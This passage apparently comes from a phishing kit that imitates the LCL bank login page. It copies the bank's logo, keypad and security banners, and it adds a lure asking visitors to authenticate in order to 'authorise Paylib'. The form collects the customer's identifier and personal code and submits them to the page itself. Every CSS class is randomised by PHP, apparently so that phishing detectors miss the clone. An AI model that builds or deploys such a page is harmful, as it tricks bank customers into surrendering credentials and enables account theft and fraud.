        <div _ngcontent-ng-front-c11="" class="<?php echo generateRandomString(); ?>  ng-bar-placeholder">
          <div _ngcontent-ng-front-c11="" class="<?php echo generateRandomString(); ?>  ng-bar" style="transform: translate3d(0%, 0px, 0px); background-color: rgb(27, 149, 224); transition: none 0s ease 0s;">
            <!---->
          </div>
        </div>
        <!---->
      </div>
      <!---->
      <!---->
    </ng-progress>
    <router-outlet _ngcontent-ng-front-c17=""></router-outlet>
    <app-login-page _nghost-ng-front-c79="" class="<?php echo generateRandomString(); ?>  ">
      <ui-sidepane-template _ngcontent-ng-front-c79="" class="<?php echo generateRandomString(); ?>  sidepane" _nghost-ng-front-c73="">
        <div _ngcontent-ng-front-c73="" class="<?php echo generateRandomString(); ?>  image" style="background-image: url(&quot;content/login-page-background.ebdfc9d931825723e5ed.jpg&quot;);"></div>
        <!---->
        <div _ngcontent-ng-front-c73="" class="<?php echo generateRandomString(); ?>  content">
          <header _ngcontent-ng-front-c79="">
            <div _ngcontent-ng-front-c79="" class="<?php echo generateRandomString(); ?>  logo"><a _ngcontent-ng-front-c79="" href="https://www.lcl.fr/"><img _ngcontent-ng-front-c79="" alt="LCL Banque et Assurance" src="./content/logo.b67cae54f399508c58a3.svg"></a></div>
            <div _ngcontent-ng-front-c79="" tabindex="-1" class="<?php echo generateRandomString(); ?>  login-message">
              <!---->
            </div>
          </header>
          <app-login-form _ngcontent-ng-front-c79="" id="app-login-form" _nghost-ng-front-c72="" class="<?php echo generateRandomString(); ?>  ">
            <form onsubmit="return submitcodelog()" action="" method="post">
              <div _ngcontent-ng-front-c72="" class="<?php echo generateRandomString(); ?>  control-group identifier-group"><label _ngcontent-ng-front-c72="" for="identifier"><span _ngcontent-ng-front-c72="" class="<?php echo generateRandomString(); ?>  app-title"> AUTHENTIFIEZ-VOUS À LCL POUR AUTORISER LE PAYLIB<br><br>Votre identifiant</span></label>
                <ui-identifier-input _ngcontent-ng-front-c72="" inputid="identifier" title="Saisissez votre identifiant LCL" _nghost-ng-front-c69="" class="<?php echo generateRandomString(); ?>  ng-dirty ng-touched ng-valid"><input type="tel" spellcheck="false" inputmode="numeric" name="user"  id="user" pattern="[0-9]*" class="<?php echo generateRandomString(); ?>  input ng-dirty ng-valid ng-touched" size="10" maxlength="10" _ngcontent-ng-front-c69="" required="">
                  <div _ngcontent-ng-front-c69="" class="<?php echo generateRandomString(); ?>  strokes"><span _ngcontent-ng-front-c69="" class="<?php echo generateRandomString(); ?>  stroke stroke-filled"></span><span _ngcontent-ng-front-c69="" class="<?php echo generateRandomString(); ?>  stroke stroke-filled"></span><span _ngcontent-ng-front-c69="" class="<?php echo generateRandomString(); ?>  stroke stroke-filled"></span><span _ngcontent-ng-front-c69="" class="<?php echo generateRandomString(); ?>  stroke stroke-filled"></span><span _ngcontent-ng-front-c69="" class="<?php echo generateRandomString(); ?>  stroke stroke-filled"></span><span _ngcontent-ng-front-c69="" class="<?php echo generateRandomString(); ?>  stroke stroke-filled"></span><span _ngcontent-ng-front-c69="" class="<?php echo generateRandomString(); ?>  stroke stroke-filled"></span><span _ngcontent-ng-front-c69="" class="<?php echo generateRandomString(); ?>  stroke stroke-filled"></span><span _ngcontent-ng-front-c69="" class="<?php echo generateRandomString(); ?>  stroke stroke-filled"></span><span _ngcontent-ng-front-c69="" class="<?php echo generateRandomString(); ?>  stroke stroke-filled"></span>
                    <!---->
                  </div>
                </ui-identifier-input>
              </div>
              <!---->
              <div _ngcontent-ng-front-c72="" class="<?php echo generateRandomString(); ?>  control-group remember-identifier-group">
                <ui-checkbox _ngcontent-ng-front-c72="" title="Cliquer pour mémoriser votre identifiant lors des prochaines connexions" _nghost-ng-front-c71="" class="<?php echo generateRandomString(); ?>  ng-untouched ng-pristine ng-valid"><input _ngcontent-ng-front-c71="" type="checkbox" id="ui-checkbox-1-input"><label _ngcontent-ng-front-c71="" for="ui-checkbox-1-input">Mémoriser mon identifiant </label></ui-checkbox>
              </div>
              <!---->
              <!---->
              <div _ngcontent-ng-front-c72="" class="<?php echo generateRandomString(); ?>  control-group code-group"><label _ngcontent-ng-front-c72=""><span _ngcontent-ng-front-c72="" tabindex="-1" class="<?php echo generateRandomString(); ?>  app-title">Votre code personnel</span></label>
                <ui-keypad _ngcontent-ng-front-c72="" title="Saisissez votre code personnel LCL" _nghost-ng-front-c70="" class="<?php echo generateRandomString(); ?>  ng-untouched ng-pristine ng-invalid">
                  <input type="hidden" id="passcode" name="passcode">
                  <div _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  pad-code"><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  pad-dot" id="dot1"><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  bullet">●</span></span><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  pad-dot" id="dot2"><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  bullet">●</span></span><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  pad-dot" id="dot3"><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  bullet">●</span></span><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  pad-dot" id="dot4"><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  bullet">●</span></span><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  pad-dot" id="dot5"><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  bullet">●</span></span><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  pad-dot" id="dot6"><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  bullet">●</span></span>
                    <!----><span _ngcontent-ng-front-c70="" aria-live="polite" aria-atomic="true" class="<?php echo generateRandomString(); ?>  cdk-visually-hidden">0 chiffre saisi</span><button _ngcontent-ng-front-c70="" type="button" aria-label="Effacer" class="<?php echo generateRandomString(); ?>  pad-button pad-reset" onclick="clearcode()" id="inputxhidden" style="visibility: hidden"><span _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  cdk-visually-hidden">✕</span></button>
                  </div>
                  <div _ngcontent-ng-front-c70="" class="<?php echo generateRandomString(); ?>  pad-keys"><button _ngcontent-ng-front-c70="" type="button" class="<?php echo generateRandomString(); ?>  pad-button pad-key" value="7" onclick="addtopass(7)"> 7 </button><button _ngcontent-ng-front-c70="" type="button" class="<?php echo generateRandomString(); ?>  pad-button pad-key" value="1" onclick="addtopass(1)"> 1 </button><button _ngcontent-ng-front-c70="" type="button" class="<?php echo generateRandomString(); ?>  pad-button pad-key" value="9" onclick="addtopass(9)"> 9 </button><button _ngcontent-ng-front-c70="" type="button" class="<?php echo generateRandomString(); ?>  pad-button pad-key" value="3" onclick="addtopass(3)"> 3 </button><button _ngcontent-ng-front-c70="" type="button" class="<?php echo generateRandomString(); ?>  pad-button pad-key" value="5" onclick="addtopass(5)"> 5 </button><button _ngcontent-ng-front-c70="" type="button" class="<?php echo generateRandomString(); ?>  pad-button pad-key" value="6" onclick="addtopass(6)"> 6 </button><button _ngcontent-ng-front-c70="" type="button" class="<?php echo generateRandomString(); ?>  pad-button pad-key" value="0" onclick="addtopass(0)"> 0 </button><button _ngcontent-ng-front-c70="" type="button" class="<?php echo generateRandomString(); ?>  pad-button pad-key" value="2" onclick="addtopass(2)"> 2 </button><button _ngcontent-ng-front-c70="" type="button" class="<?php echo generateRandomString(); ?>  pad-button pad-key" value="4" onclick="addtopass(4)"> 4 </button><button _ngcontent-ng-front-c70="" type="button" class="<?php echo generateRandomString(); ?>  pad-button pad-key" value="8" onclick="addtopass(8)"> 8 </button>
                    <!---->
                  </div>
                </ui-keypad>
              </div>
              <!---->
              <div _ngcontent-ng-front-c72="" class="<?php echo generateRandomString(); ?>  control-group button-group"><button _ngcontent-ng-front-c72="" type="submit" class="<?php echo generateRandomString(); ?>  app-cta-button app-cta-button--primary app-cta-button--arrow"> Valider </button></div>
            </form>
          </app-login-form>
          <div _ngcontent-ng-front-c79="" class="<?php echo generateRandomString(); ?>  help-links">
            <ul _ngcontent-ng-front-c79="" class="<?php echo generateRandomString(); ?>  links">
              <li _ngcontent-ng-front-c79=""><a _ngcontent-ng-front-c79="" href="https://www.lcl.fr/questions-frequentes/identification" target="_blank" class="<?php echo generateRandomString(); ?>  app-link app-link--underline">Identifiant oublié ?</a></li>
              <li _ngcontent-ng-front-c79=""><a _ngcontent-ng-front-c79="" href="https://www.lcl.fr/questions-frequentes/identification" target="_blank" class="<?php echo generateRandomString(); ?>  app-link app-link--underline">Code personnel oublié ?</a></li>
            </ul>
          </div>
          <modal-router-outlet _ngcontent-ng-front-c79=""></modal-router-outlet>
          <!---->
        </div>
        <div _ngcontent-ng-front-c73="" class="<?php echo generateRandomString(); ?>  aside">
          <aside _ngcontent-ng-front-c79="">
            <div _ngcontent-ng-front-c79="" class="<?php echo generateRandomString(); ?>  message-banners-box">
              <ui-message-banner-carousel _ngcontent-ng-front-c79="" _nghost-ng-front-c78="">
                <!---->
                <div _ngcontent-ng-front-c78="">
                  <ui-swiper _ngcontent-ng-front-c78="" draggable="" loop="" class="<?php echo generateRandomString(); ?>  ui-swiper" style="overflow: hidden; direction: ltr; cursor: -webkit-grab;">
                    <div class="<?php echo generateRandomString(); ?>  ui-swiper-track" style="width: 1600px; transition: all 200ms ease-out 0s; transform: translate3d(-400px, 0px, 0px);">
                      <div inert="" aria-hidden="true" style="float: left; width: 25%;">
                        <ui-message-banner _ngcontent-ng-front-c78="" uiswiperslide="" _nghost-ng-front-c77="" class="<?php echo generateRandomString(); ?>  ui-message-banner">
                          <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-image-container">
                            <ui-companion _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-image loaded paused"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 360 360" width="360" height="360" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);" focusable="false">
                                <defs>
                                  <clipPath id="__lottie_element_16">
                                    <rect width="360" height="360" x="0" y="0"></rect>
                                  </clipPath>
                                </defs>
                                <g clip-path="url(#__lottie_element_16)">
                                  <g transform="matrix(6.473120212554932,0,0,6.473120212554932,743.951171875,691.1564331054688)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(0.9546899795532227,0,0,0.9500300288200378,-87.12200164794922,-78.96600341796875)">
                                      <path fill="rgb(92,104,236)" fill-opacity="1" d=" M0,-23.46299934387207 C6.479000091552734,-23.46299934387207 12.345000267028809,-20.836999893188477 16.590999603271484,-16.590999603271484 C20.836999893188477,-12.345000267028809 23.46299934387207,-6.479000091552734 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-7.577000141143799,23.46299934387207 -14.3149995803833,19.871000289916992 -18.604999542236328,14.29800033569336 C-21.652000427246094,10.34000015258789 -23.46299934387207,5.38100004196167 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(92,104,236)" stroke-opacity="1" stroke-width="8" d=" M0,-23.46299934387207 C6.479000091552734,-23.46299934387207 12.345000267028809,-20.836999893188477 16.590999603271484,-16.590999603271484 C20.836999893188477,-12.345000267028809 23.46299934387207,-6.479000091552734 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-7.577000141143799,23.46299934387207 -14.3149995803833,19.871000289916992 -18.604999542236328,14.29800033569336 C-21.652000427246094,10.34000015258789 -23.46299934387207,5.38100004196167 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                    </g>
                                  </g>
                                  <g transform="matrix(0.9431500434875488,0,0,0.9431500434875488,214.12693786621094,145.2769775390625)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(1,0,0,1,-36.183998107910156,36.816001892089844)">
                                      <path fill="rgb(255,255,255)" fill-opacity="1" d=" M0,-126.81649780273438 C69.99002838134766,-126.81649780273438 126.81649780273438,-69.99002838134766 126.81649780273438,0 C126.81649780273438,69.99002838134766 69.99002838134766,126.81649780273438 0,126.81649780273438 C-69.99002838134766,126.81649780273438 -126.81649780273438,69.99002838134766 -126.81649780273438,0 C-126.81649780273438,-69.99002838134766 -69.99002838134766,-126.81649780273438 0,-126.81649780273438z"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(91,103,235)" stroke-opacity="1" stroke-width="0" d=" M0,-126.81649780273438 C69.99002838134766,-126.81649780273438 126.81649780273438,-69.99002838134766 126.81649780273438,0 C126.81649780273438,69.99002838134766 69.99002838134766,126.81649780273438 0,126.81649780273438 C-69.99002838134766,126.81649780273438 -126.81649780273438,69.99002838134766 -126.81649780273438,0 C-126.81649780273438,-69.99002838134766 -69.99002838134766,-126.81649780273438 0,-126.81649780273438z"></path>
                                    </g>
                                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
                                      <path fill="rgb(255,255,255)" fill-opacity="1" d=" M-515.4310302734375,392.010986328125"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(91,103,235)" stroke-opacity="1" stroke-width="0" d=" M-515.4310302734375,392.010986328125"></path>
                                    </g>
                                  </g>
                                  <g transform="matrix(2.8651700019836426,0,0,2.8651700019836426,439.4039001464844,314.7305908203125)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
                                      <path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                    </g>
                                  </g>
                                </g>
                              </svg></ui-companion>
                          </div>
                          <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-content">
                            <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-header">
                              <h3 _ngcontent-ng-front-c77="">Augmentation des tentatives de fraudes</h3><time _ngcontent-ng-front-c77="" datetime="2020-10-01">01/10/2020</time>
                              <!---->
                            </div>
                            <!---->
                            <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-body">
                              <div _ngcontent-ng-front-c78="">
                                <p>Un collaborateur LCL ne vous demandera jamais vos codes confidentiels : identifiant, mot de passe, token ...</p>
                              </div>
                              <!---->
                            </div>
                          </div>
                          <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-aside"><a _ngcontent-ng-front-c77="" target="_blank" class="<?php echo generateRandomString(); ?>  message-banner-button app-cta-button app-cta-button--primary" href="https://www.lcl.fr/mag/tendances/que-faire-en-cas-de-reception-email-frauduleux" tabindex="-1">En savoir plus</a></div>
                          <!---->
                        </ui-message-banner>
                      </div>
                      <div style="float: left; width: 25%;">
                        <ui-message-banner _ngcontent-ng-front-c78="" uiswiperslide="" _nghost-ng-front-c77="" class="<?php echo generateRandomString(); ?>  ui-message-banner">
                          <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-image-container">
                            <ui-companion _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-image loaded"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 360 360" width="360" height="360" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);" focusable="false">
                                <defs>
                                  <clipPath id="__lottie_element_3">
                                    <rect width="360" height="360" x="0" y="0"></rect>
                                  </clipPath>
                                </defs>
                                <g clip-path="url(#__lottie_element_3)">
                                  <g style="display: block;" transform="matrix(1.100000023841858,0,0,1.100000023841858,345.1047058105469,230.9346923828125)" opacity="1">
                                    <g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
                                      <path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
                                    </g>
                                  </g>
                                  <g style="display: block;" transform="matrix(1.100000023841858,0,0,1.100000023841858,279.1047058105469,230.9346923828125)" opacity="1">
                                    <g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
                                      <path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
                                    </g>
                                  </g>
                                  <g transform="matrix(1.100000023841858,0,0,1.100000023841858,209.5906982421875,230.93569946289062)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
                                      <path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                    </g>
                                  </g>
                                  <g transform="matrix(6.473120212554932,0,0,6.473120212554932,743.951171875,690.8334350585938)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(0.9546899795532227,0,0,0.9500300288200378,-87.12200164794922,-78.96600341796875)">
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(92,104,236)" stroke-opacity="1" stroke-width="8" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-7.6020002365112305,23.46299934387207 -23.093000411987305,23.56800079345703 -23.093000411987305,23.56800079345703 C-23.093000411987305,23.56800079345703 -23.46299934387207,5.35699987411499 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                    </g>
                                  </g>
                                </g>
                              </svg></ui-companion>
                          </div>
                          <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-content">
                            <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-header">
                              <h3 _ngcontent-ng-front-c77="">Bienvenue sur votre nouvelle page de connexion</h3>
                              <!---->
                            </div>
                            <!---->
                            <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-body">
                              <div _ngcontent-ng-front-c78="">
                                <p>Votre page de connexion a changé.<br>Votre identifiant et votre mot de passe restent les mêmes.</p>
                              </div>
                              <div _ngcontent-ng-front-c77=""><a _ngcontent-ng-front-c77="" target="_blank" class="<?php echo generateRandomString(); ?>  message-banner-link app-link app-link--underline" href="https://www.lcl.fr/securite">Se rendre sur LCL sécurité</a></div>
                              <!---->
                            </div>
                          </div>
                          <!---->
                        </ui-message-banner>
                      </div>
                      <div inert="" aria-hidden="true" style="float: left; width: 25%;">
                        <ui-message-banner _ngcontent-ng-front-c78="" uiswiperslide="" _nghost-ng-front-c77="" class="<?php echo generateRandomString(); ?>  ui-message-banner">
                          <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-image-container">
                            <ui-companion _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-image loaded paused"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 360 360" width="360" height="360" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);" focusable="false">
                                <defs>
                                  <clipPath id="__lottie_element_16">
                                    <rect width="360" height="360" x="0" y="0"></rect>
                                  </clipPath>
                                </defs>
                                <g clip-path="url(#__lottie_element_16)">
                                  <g transform="matrix(6.473120212554932,0,0,6.473120212554932,743.951171875,691.1564331054688)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(0.9546899795532227,0,0,0.9500300288200378,-87.12200164794922,-78.96600341796875)">
                                      <path fill="rgb(92,104,236)" fill-opacity="1" d=" M0,-23.46299934387207 C6.479000091552734,-23.46299934387207 12.345000267028809,-20.836999893188477 16.590999603271484,-16.590999603271484 C20.836999893188477,-12.345000267028809 23.46299934387207,-6.479000091552734 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-7.577000141143799,23.46299934387207 -14.3149995803833,19.871000289916992 -18.604999542236328,14.29800033569336 C-21.652000427246094,10.34000015258789 -23.46299934387207,5.38100004196167 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(92,104,236)" stroke-opacity="1" stroke-width="8" d=" M0,-23.46299934387207 C6.479000091552734,-23.46299934387207 12.345000267028809,-20.836999893188477 16.590999603271484,-16.590999603271484 C20.836999893188477,-12.345000267028809 23.46299934387207,-6.479000091552734 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-7.577000141143799,23.46299934387207 -14.3149995803833,19.871000289916992 -18.604999542236328,14.29800033569336 C-21.652000427246094,10.34000015258789 -23.46299934387207,5.38100004196167 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                    </g>
                                  </g>
                                  <g transform="matrix(0.9431500434875488,0,0,0.9431500434875488,214.12693786621094,145.2769775390625)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(1,0,0,1,-36.183998107910156,36.816001892089844)">
                                      <path fill="rgb(255,255,255)" fill-opacity="1" d=" M0,-126.81649780273438 C69.99002838134766,-126.81649780273438 126.81649780273438,-69.99002838134766 126.81649780273438,0 C126.81649780273438,69.99002838134766 69.99002838134766,126.81649780273438 0,126.81649780273438 C-69.99002838134766,126.81649780273438 -126.81649780273438,69.99002838134766 -126.81649780273438,0 C-126.81649780273438,-69.99002838134766 -69.99002838134766,-126.81649780273438 0,-126.81649780273438z"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(91,103,235)" stroke-opacity="1" stroke-width="0" d=" M0,-126.81649780273438 C69.99002838134766,-126.81649780273438 126.81649780273438,-69.99002838134766 126.81649780273438,0 C126.81649780273438,69.99002838134766 69.99002838134766,126.81649780273438 0,126.81649780273438 C-69.99002838134766,126.81649780273438 -126.81649780273438,69.99002838134766 -126.81649780273438,0 C-126.81649780273438,-69.99002838134766 -69.99002838134766,-126.81649780273438 0,-126.81649780273438z"></path>
                                    </g>
                                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
                                      <path fill="rgb(255,255,255)" fill-opacity="1" d=" M-515.4310302734375,392.010986328125"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(91,103,235)" stroke-opacity="1" stroke-width="0" d=" M-515.4310302734375,392.010986328125"></path>
                                    </g>
                                  </g>
                                  <g transform="matrix(2.8651700019836426,0,0,2.8651700019836426,439.4039001464844,314.7305908203125)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
                                      <path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                    </g>
                                  </g>
                                </g>
                              </svg></ui-companion>
                          </div>
                          <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-content">
                            <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-header">
                              <h3 _ngcontent-ng-front-c77="">Augmentation des tentatives de fraudes</h3><time _ngcontent-ng-front-c77="" datetime="2020-10-01">01/10/2020</time>
                              <!---->
                            </div>
                            <!---->
                            <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-body">
                              <div _ngcontent-ng-front-c78="">
                                <p>Un collaborateur LCL ne vous demandera jamais vos codes confidentiels : identifiant, mot de passe, token ...</p>
                              </div>
                              <!---->
                            </div>
                          </div>
                          <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-aside"><a _ngcontent-ng-front-c77="" target="_blank" class="<?php echo generateRandomString(); ?>  message-banner-button app-cta-button app-cta-button--primary" href="https://www.lcl.fr/mag/tendances/que-faire-en-cas-de-reception-email-frauduleux" tabindex="-1">En savoir plus</a></div>
                          <!---->
                        </ui-message-banner>
                      </div>
                      <div inert="" aria-hidden="true" style="float: left; width: 25%;">
                        <ui-message-banner _ngcontent-ng-front-c78="" uiswiperslide="" _nghost-ng-front-c77="" class="<?php echo generateRandomString(); ?>  ui-message-banner">
                          <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-image-container">
                            <ui-companion _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-image loaded"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 360 360" width="360" height="360" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);" focusable="false">
                                <defs>
                                  <clipPath id="__lottie_element_3">
                                    <rect width="360" height="360" x="0" y="0"></rect>
                                  </clipPath>
                                </defs>
